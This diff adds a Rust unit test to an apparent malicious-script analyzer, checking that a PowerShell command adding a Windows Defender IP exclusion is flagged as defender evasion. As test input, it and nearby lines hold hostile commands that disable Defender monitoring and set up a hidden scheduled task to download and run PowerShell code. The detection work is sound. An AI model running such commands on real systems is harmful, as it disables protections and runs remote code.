@@ -2751,6 +2751,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn mppreference_ipaddress_exclusion_emits_defender_evasion_trait() {
+        let script = br#"powershell -Command "Add-MpPreference -ExclusionIpAddress 10.10.10.10""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "exclusion-ipaddress" && target == "10.10.10.10"
+            )),
+            "missing DefenderEvasion exclusion-ipaddress: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn set_mppreference_disable_named_argument_forms_emit_defender_evasion_traits() {
         let script = br#"powershell -Command "Set-MpPreference -DisableRealtimeMonitoring:$true -SubmitSamplesConsent=2"
 "#;
